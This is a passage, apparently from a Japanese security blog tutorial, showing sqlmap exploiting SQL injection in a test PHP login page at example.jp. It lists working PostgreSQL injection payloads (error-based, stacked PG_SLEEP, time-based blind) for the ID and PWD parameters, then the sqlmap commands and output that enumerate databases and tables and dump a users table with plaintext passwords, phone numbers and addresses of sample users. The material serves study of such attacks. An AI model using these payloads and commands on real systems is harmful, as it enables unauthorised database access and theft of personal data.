END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'iBQp'='iBQp\n\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries\n    Payload: ID=1&PWD=2'; SELECT PG_SLEEP(5)--\n\n    Type: AND/OR time-based blind\n    Title: PostgreSQL > 8.1 AND time-based blind\n    Payload: ID=1&PWD=2' AND 9601=(SELECT 9601 FROM PG_SLEEP(5)) AND 'oMeE'='oMeE\n\nPlace: POST\nParameter: ID\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: ID=1' AND 3272=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3272=3272) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'ahLa'='ahLa&PWD=2\n\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries\n    Payload: ID=1'; SELECT PG_SLEEP(5)--&PWD=2\n\n    Type: AND/OR time-based blind\n    Title: PostgreSQL > 8.1 AND time-based blind\n    Payload: ID=1' AND 3167=(SELECT 3167 FROM PG_SLEEP(5)) AND 'GbHI'='GbHI&PWD=2\n---\n```\n\n\u3053\u3053\u3067\u306fQuit\u3067\u6b62\u3081\u307e\u3059:\n\n```bash\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: ID, type: Single quoted string (default)\n[1] place: POST, parameter: PWD, type: Single quoted string\n[q] Quit\n```\n\n\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u4e00\u89a7\u3092\u53d6\u5f97\u3059\u308b\n--------------------------------\n\n```bash\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --dbs\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\navailable databases [3]:\n[*] information_schema\n[*] pg_catalog\n[*] public\n\n[11:57:55] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 11:57:55\n```\n\n\u30c6\u30fc\u30d6\u30eb\u306e\u4e00\u89a7\u3092\u53d6\u5f97\u3059\u308b\n-------------------------\n\n```bash\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" --tables\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\nDatabase: pg_catalog\n[42 tables]\n+-------------------------+\n| pg_aggregate            |\n| pg_am                   |\n| pg_amop                 |\n| pg_amproc               |\n| pg_attrdef              |\n| pg_attribute            |\n| pg_auth_members         |\n| pg_authid               |\n| pg_cast                 |\n| pg_class                |\n| pg_constraint           |\n| pg_conversion           |\n| pg_database             |\n| pg_depend               |\n| pg_description          |\n| pg_enum                 |\n| pg_foreign_data_wrapper |\n| pg_foreign_server       |\n| pg_index                |\n| pg_inherits             |\n| pg_language             |\n| pg_largeobject          |\n| pg_listener             |\n| pg_namespace            |\n| pg_opclass              |\n| pg_operator             |\n| pg_opfamily             |\n| pg_pltemplate           |\n| pg_proc                 |\n| pg_rewrite              |\n| pg_shdepend             |\n| pg_shdescription        |\n| pg_statistic            |\n| pg_tablespace           |\n| pg_trigger              |\n| pg_ts_config            |\n| pg_ts_config_map        |\n| pg_ts_dict              |\n| pg_ts_parser            |\n| pg_ts_template          |\n| pg_type                 |\n| pg_user_mapping         |\n+-------------------------+\n\nDatabase: information_schema\n[7 tables]\n+-------------------------+\n| sql_features            |\n| sql_implementation_info |\n| sql_languages           |\n| sql_packages            |\n| sql_parts               |\n| sql_sizing              |\n| sql_sizing_profiles     |\n+-------------------------+\n\nDatabase: public\n[4 tables]\n+-------------------------+\n| books                   |\n| dummy                   |\n| test                    |\n| users                   |\n+-------------------------+\n\n[12:06:06] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 12:06:06\n```\n\n\u30c6\u30fc\u30d6\u30eb\u30c7\u30fc\u30bf\u306e\u30c0\u30f3\u30d7(users\u30c6\u30fc\u30d6\u30eb)\n----------------------------------------\n\n```bash\n$ ./sqlmap.py -u \"http://example.jp/sql_injection-003.php\" --data=\"ID=1&PWD=2\" -T users --dump\n\uff5e \u7565 \uff5e\nthere were multiple injection points, please select the one to use for following injections:\n[0] place: POST, parameter: PWD, type: Single quoted string (default)\u3000<-\u3053\u3053\u3067\u306f0\u3092\u9078\u629e\u3059\u308b\n[1] place: POST, parameter: ID, type: Single quoted string\n[q] Quit\n\n\uff5e \u7565 \uff5e\n\nDatabase: public\nTable: users\n[3 entries]\n+--------+--------------+----------+---------+--------------------+------+\n| id     | tel          | pwd      | addr    | mail               | name |\n+--------+--------------+----------+---------+--------------------+------+\n| sato   | 045-123-4567 | password | \u795e\u5948\u5ddd\u770c\u6a2a\u6d5c\u5e02 | sato@example.net   | \u4f50\u85e4\u4e00\u5fd7 |\n| tanaka | 03-1234-5678 | pass1    | \u6771\u4eac\u90fd\u6e2f\u533a\u4e09\u7530 | takana@example.com | \u5c71\u77f3\u4eac\u5b50 |\n| yamada | 046-123-4567 | pass1    | \u795e\u5948\u5ddd\u770c\u5ddd\u5d0e\u5e02 | yamada@example.jp  | \u5c71\u7530\u592a\u4e00 |\n+--------+--------------+----------+---------+--------------------+------+\n\n[12:08:35] [INFO] table 'public.users' dumped to CSV file '/home/shyamahira/.sqlmap/output/example.jp/dump/public/users.csv'\n[12:08:35] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'\n\n[*] shutting down at 12:08:35\n```\n\n\u6700\u5f8c\u306b\n------\n\nsqlmap\u3092\u5b9f\u884c\u3057\u305f\u6642\u3001\u653b\u6483\u5bfe\u8c61\u306b\u3069\u3093\u306a\u30a2\u30af\u30bb\u30b9\u304c\u6765\u3066\u3044\u308b\u304b\u306b\u3064\u3044\u3066\u306f\n\u6642\u9593\u306e\u3042\u308b\u6642\u306b\u8ffd\u8a18\u3057\u305f\u3044\u3068\u601d\u3044\u307e\u3059\u3002\n", "tags": ["Security"]}